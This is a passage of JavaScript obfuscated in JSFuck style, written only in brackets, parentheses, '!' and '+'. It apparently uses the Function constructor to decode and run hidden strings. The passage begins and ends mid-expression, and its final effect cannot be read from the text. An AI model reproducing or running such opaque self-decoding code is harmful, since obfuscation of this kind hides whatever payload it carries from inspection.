]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+!+[]]]+[!+[]+!+[]+!+[]+!+[]]+(![]+[])[+!+[]])+[!+[]+!+[]+!+[]+!+[]+!+[]]+(+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+(+!+[]+[+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]])[+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+[+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+[+!+[]])+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+!+[]]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+[]])+[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]